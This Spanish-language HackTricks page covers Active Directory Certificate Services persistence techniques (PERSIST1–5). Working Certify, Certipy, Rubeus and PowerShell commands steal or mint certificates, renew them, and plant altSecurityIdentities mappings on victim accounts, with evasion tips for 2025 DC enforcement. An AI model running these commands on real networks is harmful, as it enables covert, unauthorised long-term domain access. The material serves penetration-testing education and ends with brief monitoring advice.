# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Este es un pequeño resumen de los capítulos sobre persistencia de cuentas de la excelente investigación de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Comprendiendo el robo de credenciales de usuarios activos con certificados – PERSIST1

En un escenario en el que un usuario puede solicitar un certificado que permite la autenticación en el dominio, un atacante tiene la oportunidad de solicitar y robar este certificado para mantener la persistencia en una red. De forma predeterminada, la plantilla `User` de Active Directory permite este tipo de solicitudes, aunque en ocasiones puede estar deshabilitada.<sup>[[3]](#references)[[7]](#references)</sup>

Mediante [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puedes buscar plantillas habilitadas que permitan la autenticación de cliente y, a continuación, solicitar una:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
El poder de un certificado reside en su capacidad para autenticarse como el usuario al que pertenece, independientemente de los cambios de contraseña, siempre que el certificado siga siendo válido.

Puedes convertir PEM a PFX y utilizarlo para obtener un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinada con otras técnicas (consulta las secciones THEFT), la autenticación basada en certificados permite un acceso persistente sin tocar LSASS e incluso desde contextos sin elevación.

## Obtención de persistencia en el equipo con certificados - PERSIST2

Si un atacante tiene privilegios elevados en un host, puede inscribir la cuenta de equipo del sistema comprometido para obtener un certificado mediante la plantilla predeterminada `Machine`. Autenticarse como el equipo permite usar S4U2Self para servicios locales y puede proporcionar una persistencia duradera en el host:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extender la Persistencia mediante la Renovación de Certificados - PERSIST3

Abusar de los periodos de validez y renovación de las plantillas de certificados permite a un atacante mantener el acceso a largo plazo. Si posees un certificado emitido previamente y su clave privada, puedes renovarlo antes de que expire para obtener una credencial nueva y de larga duración sin dejar artefactos adicionales de solicitud vinculados al principal original.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Consejo operativo: Realiza un seguimiento de la vigencia de los archivos PFX bajo el control del atacante y renuévalos con antelación. La renovación también puede hacer que los certificados actualizados incluyan la extensión moderna de asignación SID, manteniéndolos utilizables bajo reglas más estrictas de asignación del DC (consulta la siguiente sección).

## Plantación de asignaciones de certificados explícitas (altSecurityIdentities) – PERSIST4

Si puedes escribir en el atributo `altSecurityIdentities` de una cuenta objetivo, puedes asignar explícitamente un certificado controlado por el atacante a esa cuenta. Esto persiste tras los cambios de contraseña y, al utilizar formatos de asignación robustos, sigue funcionando bajo la aplicación de reglas modernas del DC.<sup>[[2]](#references)</sup>

Flujo de alto nivel:

1. Obtén o emite un certificado de autenticación de cliente que controles (por ejemplo, inscríbete en la plantilla `User` como tú mismo).
2. Extrae un identificador robusto del certificado (`Issuer+Serial`, `SKI` o `SHA1-PublicKey`).
3. Añade una asignación explícita en `altSecurityIdentities` del principal víctima utilizando ese identificador.
4. Autentícate con tu certificado; el DC lo asignará a la víctima mediante la asignación explícita.

Ejemplo (PowerShell) utilizando una asignación robusta `Issuer+Serial`:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Luego autentícate con tu PFX. Certipy obtendrá un TGT directamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construcción de mapeos sólidos de `altSecurityIdentities`

En la práctica, los mapeos **Issuer+Serial** y **SKI** son los formatos sólidos más fáciles de construir a partir de un certificado en posesión del atacante. Esto es importante después del **11 de febrero de 2025**, cuando los DCs pasan de forma predeterminada a **Full Enforcement** y los mapeos débiles dejan de ser fiables.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Usa únicamente tipos de mapping fuertes: `X509IssuerSerialNumber`, `X509SKI` o `X509SHA1PublicKey`. Los formatos débiles (Subject/Issuer, solo Subject, correo RFC822) están obsoletos y pueden bloquearse mediante la política del DC.
- El mapping funciona tanto en objetos de **usuario** como de **equipo**, por lo que el acceso de escritura a `altSecurityIdentities` de una cuenta de equipo es suficiente para persistir como esa máquina.
- La cadena de certificados debe construir una cadena hasta una raíz de confianza del DC. Las CA Enterprise en NTAuth suelen ser de confianza; algunos entornos también confían en CA públicas.
- La autenticación Schannel sigue siendo útil para la persistencia incluso cuando PKINIT falla porque el DC no tiene el EKU Smart Card Logon o devuelve `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Mapeos explícitos de `Issuer/SID` en 2025+

En los controladores de dominio **Windows Server 2022+** con el parche de la actualización de seguridad del **9 de septiembre de 2025**, Microsoft añadió otro formato de mapping explícito fuerte que resulta atractivo para la persistencia porque sobrevive a la reemisión de certificados desde la misma CA:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operacionalmente, esto difiere de los formatos strong más antiguos:
- `Issuer+Serial` fija **un certificado exacto**.
- `SKI` / `SHA1-PUKEY` fija **un único par de claves**.
- `Issuer/SID` fija la **CA emisora + el SID objetivo**, por lo que los certificados renovados o reemitidos desde la misma CA siguen funcionando sin tener que reescribir `altSecurityIdentities`.

Requisitos y advertencias
- El certificado presentado para el logon debe contener realmente el SID de la cuenta objetivo en la extensión de seguridad SID.
- Este formato no es útil para certificados de tipo `ESC9` / `ESC16` que omiten la extensión SID; en esos casos, usa `Issuer+Serial`, `SKI` o `SHA1-PUKEY`.

Para obtener más información sobre mappings explícitos débiles y attack paths, consulta:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent como Persistence – PERSIST5

Si obtienes un certificado válido de Certificate Request Agent/Enrollment Agent, puedes crear nuevos certificados capaces de realizar logon en nombre de los usuarios cuando quieras y mantener el PFX del agent offline como token de persistence. Flujo de abuso:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Es necesario revocar el certificado del agente o los permisos de la plantilla para expulsar esta persistencia.

Notas operativas
- Las versiones modernas de `Certipy` admiten tanto `-on-behalf-of` como `-renew`, por lo que un atacante que posea un PFX de Enrollment Agent puede acuñar y renovar posteriormente certificados leaf sin volver a interactuar con la cuenta objetivo.<sup>[[4]](#references)</sup>
- Si no es posible obtener un TGT mediante PKINIT, el certificado resultante on-behalf-of sigue siendo utilizable para la autenticación Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Uso de certificados persistidos cuando PKINIT falla

Si el DC no tiene un certificado compatible con Smart Card Logon, el inicio de sesión mediante certificado a través de PKINIT puede fallar con `KDC_ERR_PADATA_TYPE_NOSUPP`. Eso **no** elimina la primitive de persistencia: el mismo PFX a menudo sigue siendo utilizable para acceder a LDAP autenticado mediante Schannel.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Esto resulta especialmente útil después de PERSIST4/PERSIST5, porque puedes seguir operando desde Linux/macOS y encadenar otras acciones de persistencia en el directorio, como dejar [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) o editar atributos de delegación modificables.

## Aplicación del mapeo fuerte de certificados de 2025: impacto en la persistencia

Microsoft KB5014754 introdujo la aplicación del mapeo fuerte de certificados en los controladores de dominio. Desde el **11 de febrero de 2025**, los DC utilizan de forma predeterminada **Full Enforcement** para los mapeos débiles/ambiguos y, a partir de la actualización de seguridad del **9 de septiembre de 2025**, los DC parcheados ya no admiten la alternativa del antiguo modo Compatibility.<sup>[[1]](#references)</sup> Implicaciones prácticas:

- Los certificados anteriores a 2022 que carezcan de la extensión de mapeo SID pueden fallar en el mapeo implícito cuando los DC estén en Full Enforcement. Los atacantes pueden mantener el acceso renovando certificados mediante AD CS (para obtener la extensión SID) o plantando un mapeo explícito fuerte en `altSecurityIdentities` (PERSIST4).
- Los mapeos explícitos que utilizan formatos fuertes (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` y, en los DC modernos, `Issuer/SID`) siguen funcionando. Los formatos débiles (Issuer/Subject, Subject-only, RFC822) pueden bloquearse y deben evitarse para la persistencia.
- Si los mapeos débiles todavía parecen funcionar, asume que has llegado a un DC sin parchear o configurado de forma diferente, en lugar de considerarlo una vía fiable de persistencia a largo plazo.
- Las vías de emisión del tipo `ESC9` / `ESC16` que suprimen la extensión SID hacen que `Issuer/SID` no se pueda utilizar, por lo que los mapeos fuertes alternativos o la renovación mediante una plantilla normal se convierten en la opción práctica de persistencia.

Los administradores deben monitorizar y generar alertas sobre:
- Cambios en `altSecurityIdentities` y emisiones/renovaciones de certificados de Enrollment Agent y User.
- Registros de emisión de la CA para solicitudes en nombre de terceros y patrones de renovación inusuales.

## References

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
